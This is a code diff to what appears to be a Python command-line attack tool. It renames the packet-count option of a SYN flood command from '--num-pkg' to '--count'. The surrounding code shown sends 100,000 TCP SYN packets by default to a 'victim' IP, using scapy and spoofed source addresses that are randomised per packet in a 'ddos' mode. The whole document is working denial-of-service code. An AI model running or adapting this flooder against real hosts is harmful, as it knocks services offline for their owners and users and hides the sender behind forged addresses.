@@ -7,7 +7,7 @@ from cli.utils.common import get_victim_ip, rand_int, random_ip
 @click.command()
 @click.option("-i", "--ip", help="IP address of the victim", type=str)
 @click.option(
-    "-n", "--num-pkg", help="Number of packages to send", type=int, default=100000
+    "-c", "--count", help="Number of packages to send", type=int, default=100000
 )
 @click.option(
     "-m",
@@ -17,7 +17,7 @@ from cli.utils.common import get_victim_ip, rand_int, random_ip
     default="dos",
 )
 @click.pass_context
-def syn_flood(ctx, ip, num_pkg, mode):
+def syn_flood(ctx, ip, count, mode):
     """SYN flood attack"""
     click.echo("\n\n-------------------- SYN flood attack ---------------------\n")
     if not ip:
@@ -27,7 +27,7 @@ def syn_flood(ctx, ip, num_pkg, mode):
     click.echo(f"Click to access as a legitimate client: http://{ip}")
     src_ip = random_ip()
 
-    for _ in range(num_pkg):
+    for _ in range(count):
         if mode == "ddos":
             src_ip = random_ip()
         IP_packet = IP(src=src_ip, dst=ip)
@@ -39,5 +39,5 @@ def syn_flood(ctx, ip, num_pkg, mode):
         send(IP_packet / TCP_package / raw, verbose=0)
 
     click.echo(
-        f"{mode}SYN flood attack on {ip} finished! Total {num_pkg} packages sent\n"
+        f"{mode}SYN flood attack on {ip} finished! Total {count} packages sent\n"
     )
